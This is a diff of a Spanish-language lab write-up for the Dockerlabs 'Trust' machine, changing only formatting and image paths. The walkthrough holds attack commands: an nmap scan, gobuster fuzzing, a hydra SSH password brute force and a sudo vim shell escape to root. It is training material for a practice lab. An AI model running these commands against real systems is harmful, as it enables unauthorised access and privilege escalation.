@@ -1,13 +1,6 @@
 # Trust
 
-Plataforma: Dockerlabs
-OS: Linux
-Level: Very Easy
-Status: Done
-Complete: Yes
-EJPT: yes
-Created time: 4 de diciembre de 2024 21:12
-IP: 172.17.0.2
+Plataforma: Dockerlabs OS: Linux Level: Very Easy Status: Done Complete: Yes EJPT: yes Created time: 4 de diciembre de 2024 21:12 IP: 172.17.0.2
 
 ## Recopilación de información
 
@@ -15,34 +8,34 @@ IP: 172.17.0.2
 
 Comenzamos con un escaneo para identificar que puertos están abiertos.
 
----
+***
 
 ```bash
 sudo nmap -p-  --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
 ```
 
-![image.png](/images/DockerLabs/image.png)
+![image.png](../../.gitbook/assets/image.png)
 
 ### **Enumeración de servicios**
 
 Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.
 
----
+***
 
-- **Identificación de vulnerabilidades**
-    - 22
-    - 80
-    
+*   **Identificación de vulnerabilidades**
+
+    * 22
+    * 80
+
     Fuzzing :
-    
+
     ```bash
     gobuster dir -u http://172.17.0.2 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x php,txt
     ```
-    
+
     Encontramos ruta : secret.php
-    
-    ![image.png](/images/DockerLabs/image%201.png)
-    
+
+    ![image.png](<../../.gitbook/assets/image 1.png>)
 
 ## Explotación
 
@@ -54,7 +47,7 @@ Al tener un usuario en la web y el puerto 22 abierto, probamos a bruteforcear el
 hydra -l mario -P /usr/share/wordlist/rockyou.txt ssh://172.17.0.2 -v
 ```
 
-![image.png](/images/DockerLabs/image%202.png)
+![image.png](<../../.gitbook/assets/image 2.png>)
 
 Obtenemos password :
 
@@ -70,7 +63,7 @@ Accedemos por ssh con usuario y password. Buscamos binarios SUID
 sudo -l
 ```
 
-![image.png](/images/DockerLabs/image%203.png)
+![image.png](<../../.gitbook/assets/image 3.png>)
 
 Buscamos como explotar el binaro en GTFObins: vim
 
@@ -79,7 +72,7 @@ sudo vim -c ':!/bin/sh'
 
 ```
 
-![image.png](/images/DockerLabs/image%204.png)
+![image.png](<../../.gitbook/assets/image 4.png>)
 
 ## Conclusión
 
